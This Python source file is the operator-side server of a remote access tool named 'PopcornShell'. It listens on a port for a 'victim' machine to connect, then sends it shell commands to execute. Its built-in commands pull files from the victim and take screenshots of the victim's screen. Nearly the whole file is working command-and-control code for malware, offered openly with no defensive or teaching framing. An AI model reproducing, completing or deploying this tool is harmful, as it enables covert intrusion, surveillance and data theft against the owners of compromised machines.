import sys
import os
import json
from command_payload import CommandPayload
from command_payload import parse_payload_to_output
from secure_socket import SecureSocket

# Port listening for the victim's connection
port = 7777

# Style out prompt and output
verbose = "full"
exit_flag = False


def load_settings():
    global port
    base_path = os.path.dirname(os.path.abspath(__file__))
    data_path = os.path.join(base_path, 'config.json')
    # Read the data file
    with open(data_path) as f:
        data = json.load(f)
        port = int(data["Popcorn_Port"])


# Custom command behaviour
def parse_custom_command(cmd: list) -> list:
    global verbose
    global exit_flag
    if len(cmd) == 1:
        print("Emtpy command")
    elif cmd[1] == "help":
        show_help()
    elif cmd[1] == "exit" or cmd[1] == "exit_full":
        print("Exiting")
        exit_flag = True
        return cmd
    elif cmd[1] == "simple":
        verbose = "simple"
    elif cmd[1] == "full":
        verbose = "full"
    elif cmd[1] == "file":
        if len(cmd) == 3:
            return cmd
        else:
            print("File command must have exactly 1 file name")
    elif cmd[1] == "screen":
        return cmd
    else:
        print("Invalid command")
    return [""]


# Create the server socket that await the victim to connect to
def create_socket():
    global verbose
    global exit_flag
    global port

    # Create socket and wait for connection
    secure_socket = SecureSocket()
    secure_socket.wait_for_connection(port=port)

    # Receive data from the client
    while True:
        prompt = "Send command (type \"-> help\" to help): " if verbose == "full" else ">"
        command = input(prompt)
        command = command.split(" ")

        # Parse custom commands
        if command[0] == "->":
            command = parse_custom_command(command)

        # Skip empty command (new line)
        if len(command) == 1 and command[0] == "":
            continue

        # Send command
        payload = CommandPayload(command=command)
        packet = payload.pack()
        # Send failed
        if not secure_socket.send(packet):
            print("Resetting connection")
            create_socket()

        if exit_flag:
            secure_socket.close()
            exit(0)

        # Receive result
        payload = secure_socket.receive(parse_payload_to_output)
        if type(payload) is not CommandPayload:
            if len(payload) == 0:
                print("Connection lost")
                secure_socket.close()
                create_socket()
            else:
                continue
        if payload.file is not None:
            with open(payload.file_name, "wb") as file:
                file.write(payload.file)
        else:
            print(payload.formatted_output(verbose))


def show_logo():
    content = '''
███████████████████████████████████████████████████████████████████████
█▄─▄▄─█─▄▄─█▄─▄▄─█─▄▄▄─█─▄▄─█▄─▄▄▀█▄─▀█▄─▄█─▄▄▄▄█─█─█▄─▄▄─█▄─▄███▄─▄███
██─▄▄▄█─██─██─▄▄▄█─███▀█─██─██─▄─▄██─█▄▀─██▄▄▄▄─█─▄─██─▄█▀██─██▀██─██▀█
▀▄▄▄▀▀▀▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀
'''
    print(content)


def show_help():
    content = '''
Help menu
This is the server script that awaits a victim to connect to
Once connected, you can send shell command for the victim to execute

=========== Custom commands ==========
-> help
    - to see this page
-> exit 
    - to exit shell locally, victim return to trying to connect
-> exit_full 
    - to let victim exit too
-> simple
    - to simplify output
-> full
    - to use full output
-> file [file_name]
    - to get a file
-> screen 
    - take a screen shot and send it back
======================================
'''
    print(content)


def main():
    show_logo()
    load_settings()
    if len(sys.argv) > 1:
        show_help()
        exit(0)
    create_socket()


if __name__ == '__main__':
    main()
